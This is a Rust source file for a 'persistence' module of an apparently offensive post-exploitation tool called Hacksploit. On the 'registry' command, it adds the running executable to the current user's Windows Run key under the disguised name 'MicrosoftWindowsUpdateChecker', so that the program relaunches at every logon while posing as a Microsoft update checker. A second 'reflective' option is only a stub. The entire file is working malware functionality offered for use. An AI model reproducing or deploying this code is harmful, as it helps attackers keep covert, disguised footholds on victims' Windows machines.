use crate::HacksploitModule;

use std::{io::Error, path::Path};
use winreg::{enums::*, RegKey};

pub struct PersistenceModule {}

impl PersistenceModule {
    pub fn new() -> Self {
        PersistenceModule {}
    }
}

impl HacksploitModule for PersistenceModule {
    fn on_command(&self, args: Vec<&str>) -> String {
        let arg = args.get(0);

        if arg.is_some() {
            if arg.unwrap().eq_ignore_ascii_case("registry") {
                return match get_registry_output() {
                    Ok(output) => output,
                    Err(_) => String::from("There was an error doing that"),
                };
            }
            if arg.unwrap().eq_ignore_ascii_case("reflective") {
                return String::from("Not implemented yet.");
            }
        }
        return String::from("Usage - persistence <registry|reflective>");
    }

    fn get_name(&self) -> String {
        String::from("persistence")
    }

    fn get_description(&self) -> String {
        String::from("Gets persistence via registry keys.")
    }
}

pub fn get_registry_output() -> Result<String, Error> {
    let output: String = match std::env::current_exe()?.into_os_string().into_string() {
        Ok(exe) => {
            get_registry_persistence(exe)?;
            String::from("\n:-) REGISTRY PERSISTENCE SUCCESSFUL\n")
        }
        Err(_) => String::from("There was an error doing that..\n"),
    };
    Ok(output)
}

fn get_registry_persistence(exe_path: String) -> Result<(), Error> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");
    let (key, _) = hkcu.create_subkey(&path)?;
    key.set_value("MicrosoftWindowsUpdateChecker", &exe_path)?;
    Ok(())
}
